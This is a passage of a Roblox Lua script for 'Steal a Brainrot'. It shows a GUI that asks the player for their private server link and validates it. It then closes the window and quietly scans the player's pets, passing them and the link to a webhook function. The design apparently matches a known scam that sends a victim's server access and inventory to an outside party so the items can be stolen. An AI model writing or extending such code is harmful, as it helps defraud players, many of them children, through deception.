statusLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
statusLabel.BackgroundTransparency = 1

local sendButton = Instance.new("TextButton", frame)
sendButton.Text = "Send"
sendButton.Font = Enum.Font.FredokaOne
sendButton.TextSize = 18
sendButton.TextColor3 = Color3.fromRGB(255, 255, 255)
sendButton.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
sendButton.Size = UDim2.new(0.4, 0, 0, 32)
sendButton.Position = UDim2.new(0.3, 0, 0, 120)
Instance.new("UICorner", sendButton).CornerRadius = UDim.new(0, 8)

-- ✅ Private server link validation (ONLY Steal a Brainrot)
local SAB_GAME_ID = "109983668079237"

local function isValidPrivateServerLink(txt)
    if not txt or txt == "" then
        return false, "Please enter a link ❌"
    end

    -- Only allow proper Roblox private server share links
    local code = txt:match("^https://www%.roblox%.com/share%?code=([%w%-]+)&type=Server$")
    if not code then
        return false, "Invalid link ❌"
    end

    -- Ensure it’s for Steal a Brainrot only
    if tostring(game.GameId) ~= SAB_GAME_ID then
        return false, "This game is not Steal a Brainrot ❌"
    end

    return true, "Valid ✅"
end

textBox:GetPropertyChangedSignal("Text"):Connect(function()
    local valid, msg = isValidPrivateServerLink(textBox.Text)
    statusLabel.Text = msg
    if valid then
        statusLabel.TextColor3 = Color3.fromRGB(0, 255, 0)
    elseif msg:find("not Steal a Brainrot") then
        statusLabel.TextColor3 = Color3.fromRGB(255, 200, 0)
    else
        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end)

local function handleSend()
    local txt = textBox.Text or ""
    local valid, msg = isValidPrivateServerLink(txt)
    if valid then
        screenGui:Destroy()
        task.spawn(function()
            local pets = scanMyBase()
            if #pets > 0 then
                sendWebhook(pets, txt)
            end
        end)
    else
        statusLabel.Text = msg
        statusLabel.TextColor3 = Color3.fromRGB(255, 0, 0)
    end
end

sendButton.MouseButton1Click:Connect(handleSend)
textBox.FocusLost:Connect(function(enterPressed)
    if enterPressed then handleSend() end
end)
